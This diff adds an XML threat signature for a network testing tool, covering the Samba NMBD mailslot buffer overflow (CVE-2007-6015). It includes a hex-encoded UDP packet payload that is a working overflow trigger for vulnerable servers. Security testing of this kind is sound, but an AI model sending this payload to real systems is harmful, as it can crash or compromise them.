@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Samba Domain Controller Service Crafted Mailslot Name Buffer Overflow"/>
+    <EngDesc display="true" value="There is a buffer overflow vulnerability exists in the NMBD service of Samba. The vulnerability is due to a boundary error while processing specially crafted SAM LOGON requests when Samba is configured as a Primary or Backup Domain Controller. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="NETBIOS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Samba_Team"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Samba_Team_Samba_Team_Samba"/>
+      <item value="Samba_Team_Samba_Team_Mac_OS_X"/>
+      <item value="Samba_Team_Samba_Team_Ubuntu_Linux"/>
+      <item value="Samba_Team_Samba_Team_Debian_GNU/Linux"/>
+      <item value="Samba_Team_Samba_Team_SUSE_LINUX"/>
+      <item value="Samba_Team_Samba_Team_Desktop_Linux"/>
+      <item value="Samba_Team_Samba_Team_Red_Hat_Enterprise_Linux"/>
+      <item value="Samba_Team_Samba_Team_Linux"/>
+      <item value="Samba_Team_Samba_Team_Solaris"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Samba_Team_Samba_3.0.27a"/>
+      <item value="Samba_Team_Mac_OS_X_"/>
+      <item value="Samba_Team_Ubuntu_Linux_"/>
+      <item value="Samba_Team_Debian_GNU/Linux_"/>
+      <item value="Samba_Team_SUSE_LINUX_"/>
+      <item value="Samba_Team_Desktop_Linux_"/>
+      <item value="Samba_Team_Red_Hat_Enterprise_Linux_"/>
+      <item value="Samba_Team_Linux_"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20071210-10"/>
+    <CVEID display="true" value="CVE-2007-6015"/>
+    <bugtraqID display="true" value="26791"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="e5360d2143c0bcf351c0a75dc34a7653"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633396732326026250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1204094630" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="" Payload="1102ADDEAC1001028C350000023E2048484844444144414441444144424341434143414341434143414341434141410020474547494744484144424448444943414341434143414341434143414341414100FF534D42250000000000000000000000000000000000000000000000000000000C000000000000000000000000000000000000000000008D0161005C4D41494C534C4F545C4E45545C4E544C4F474F4E000000000000000000000000000000000012000000000000004141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
